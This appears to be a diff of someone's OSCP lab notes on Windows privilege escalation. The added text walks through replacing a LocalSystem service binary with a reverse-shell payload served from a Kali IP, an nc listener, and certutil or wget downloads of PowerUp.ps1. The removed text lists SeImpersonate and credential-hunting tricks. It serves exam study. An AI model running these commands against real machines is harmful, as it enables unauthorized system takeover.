@@ -136,61 +136,267 @@ netstat -ano | findstr LISTENING
 
 
 ---
-# Priv Esc Enumeration
 
-1. [[LinWinPEAS|winpeas.exe]] 
-2. [[PowerUp.ps1]]
-3. [[SharpUp.exe]]
-run `Invoke-AllChecks` to automatically find misconfigured services.
+# Restart Windows Machine
+
+```
+shutdown /r /t 0
+```
+
+# Privilege Escalation Diagnostics
+
+## 1. Check Service Configuration
+
+Display the service configuration, including executable path, startup type and service account.
+
+```
+sc.exe qc GPGOrchestrator
+```
+
+**Important fields:**
+
+- `BINARY_PATH_NAME` – executable launched by the service.
+- `START_TYPE` – whether the service starts automatically.
+- `SERVICE_START_NAME` – account running the service.
+
+```
+BINARY_PATH_NAME:
+"C:\Program Files\MilleGPG5\GPGService.exe"
+
+START_TYPE:
+2 AUTO_START
+
+SERVICE_START_NAME:
+LocalSystem
+```
+
+## 2. Check Service Status
+
+```
+sc.exe query GPGOrchestrator
+```
+
+Check whether the service is running, stopped or stuck starting.
+
+Possible states:
+
+- `RUNNING`
+- `STOPPED`
+- `START_PENDING`
+
+## 3. Check Service Using PowerShell
+
+```
+Get-Service GPGOrchestrator
+```
+Displays the service status and name.
+
+## 4. Check Executable File Information
+
+```
+Get-Item "C:\Program Files\MilleGPG5\GPGService.exe" |
+Select-Object Name, Length, LastWriteTime
+```
+
+Useful for checking:
+
+- Filename
+- File size
+- **Last modification timestamp**
+
+## 5. Check Executable and Directory Permissions
+
+```
+icacls "C:\Program Files\MilleGPG5\GPGService.exe"
+```
+
+Check permissions on the parent directory:
+
+```
+icacls "C:\Program Files\MilleGPG5"
+```
+
+Look for permissions such as:
+
+- `(F)` – Full control
+- `(M)` – Modify
+- `(W)` – Write
+- `(RX)` – Read and execute
+
+Pay particular attention to permissions assigned to `BUILTIN\Users` or `Authenticated Users`.
+
+## 6. Check Windows Service Errors
+
+Retrieve the latest 15 Service Control Manager events:
+
+```
+Get-WinEvent -FilterHashtable @{
+    LogName = 'System'
+    ProviderName = 'Service Control Manager'
+} -MaxEvents 15 | Format-List TimeCreated, Id, Message
+```
+
+Retrieve the latest 20 events:
+
+```
+Get-WinEvent -FilterHashtable @{
+    LogName = 'System'
+    ProviderName = 'Service Control Manager'
+} -MaxEvents 20 | Select-Object TimeCreated, Id, Message
+```
+
+### Relevant Event ID
+
+|Event ID|Meaning|
+|---|---|
+|7000|Service failed to start|
+|7009|Service connection timeout|
+|7011|Service control request timeout|
+
+Event ID 7000 can indicate that the service failed to complete its startup process. It does not independently establish whether the executable ran.
 
 ---
 
-| **Linux Concept**                                                   | **Windows Equivalent**                              | **The Exploit Strategy**                                                                                                                                                              |
-| ------------------------------------------------------------------- | --------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **SUID Binaries** (Owned by root, executable by you)                | **Unquoted Service Paths** or **Writable Services** | If a service path has spaces and no quotes, Windows searches for executables at every space. You can hijack it by dropping your own `program.exe` in the path.                        |
-| **Cron Jobs** (Scripts running automatically as root)               | **Scheduled Tasks**                                 | Run `schtasks /query /fo LIST /v` to find tasks running as `SYSTEM` that execute scripts or binaries you have permission to modify/overwrite.                                         |
-| **Kernel Exploits** (DirtyCOW, Pkexec)                              | **Token Impersonation / Rotten Potato**             | If `whoami /priv` shows `SeImpersonatePrivilege`, you can use tools like `PrintSpoofer` or `GodPotato` to force a SYSTEM service to authenticate to you, letting you steal its token. |
-| **Hardcoded cleartext credentials** (Config files, `.bash_history`) | **Registry / Unattended Installs**                  | Windows constantly leaves passwords in `C:\Windows\Panther\Unattend.xml` or stored deep in the Registry. `winpeas` will find these instantly.                                         |
+## 7. Kali Listener Diagnostics
 
-No Wget/Curl
+Check whether the intended callback port is already occupied:
 
 ```
-cd ~/Desktop/Tools/PEAS && python -m http.server 80
+sudo ss -lntp
 ```
 
-Windows wget using InvokePowershell from Powershell
+Check a particular port, for example 135:
+
+```
+sudo ss -lntp | grep ':135'
+```
+
+Start a Netcat listener:
+
+```
+nc -lvnp 135
+```
+
+The listener port must match the payload's configured callback port.
+
+## 8. Kali HTTP Server Diagnostics
+
+Start an HTTP server in the directory containing the payload:
+
+```
+python3 -m http.server 8080
+```
+
+The target downloads the payload from:
+
+```
+http://192.168.45.178:8080/shell.exe
+```
+
+Check the HTTP server output for a successful GET request.
+
+---
+
+## Troubleshooting Checklist
+
+- Confirm GPGOrchestrator points to `GPGService.exe`.
+    
+- Confirm the service runs as `LocalSystem`.
+    
+- Confirm the service startup type.
+    
+- Verify the replacement executable's file information.
+    
+- Check file and directory permissions.
+    
+- Check Windows Service Control Manager errors.
+    
+- Confirm the payload architecture matches the target.
+    
+- Confirm the payload callback IP and port.
+    
+- Confirm the Kali listener is running on the matching port.
+    
+- Check whether the HTTP server recorded a successful download.
+    
+
+## Key Concepts
+
+|Component|Purpose|
+|---|---|
+|GPGOrchestrator|Windows service|
+|GPGService.exe|Executable associated with GPGOrchestrator|
+|LocalSystem|Highly privileged Windows service account|
+|Port 8080|HTTP payload download|
+|Callback port|Reverse-shell connection|
+|Event ID 7000|Service startup failure|
+
+**Important:** A service startup failure does not necessarily mean the replacement executable never ran. Check the listener and event logs independently.
+# Step 1 : Transfer PowerUp.ps1 from KALI ATTACKER to WINDOWS TARGET
+
+On KALI ATTACKER
+```
+cd ~/Desktop/Tools/Windows && python -m http.server 80
+```
+
+# Step 2 : On WINDOWS TARGET: Powershell (MODIFY OUTFILE DESTINATION)
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `iwr -uri http://${KaliIP}/winPEASx64.exe -OutFile winpeas.exe`;
+const command = `powershell wget http://${KaliIP}/PowerUp.ps1 -OutFile C:\\\Users\\\mike\\\Desktop\\\PowerUp.ps1`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-Windows wget using InvokePowershell from Outside Powershell
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `powershell -c "iwr -uri http://${KaliIP}/winPEASx64.exe -OutFile winpeas.exe"`;
+const command = `certutil -urlcache -split -f http://${KaliIP}/PowerUp.ps1 PowerUp.ps1`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-or
-
-Windows wget using certutil.exe
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
-
-const command = `certutil.exe -f -urlcache -split http://${KaliIP}/winPEASx64.exe`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
-```
-winpeas.exe
-```
-
 ```powershell
-./winpeas.exe
+. .\PowerUp.ps1; Invoke-AllChecks
 ```
+
+---
+
+```
+sc.exe qc [servicename]
+```
+
+```
+icacls [servicename]
+```
+
+Check startup
+```
+Get-WinEvent -FilterHashtable @{
+    LogName = 'System'
+    ProviderName = 'Service Control Manager'
+} -MaxEvents 15 | Format-List TimeCreated, Id, Message
+```
+
+Example output
+```powershell
+sc.exe qc VeyonService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: VeyonService
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Users\Ela Arwel\Veyon\veyon-service.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Veyon Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+```
+
+Autostart means reboot system to work
+LocalSystem > Run as Root
+
+[[Hijack EXE]]
 
 ---
 # Windows Admin Creds Search
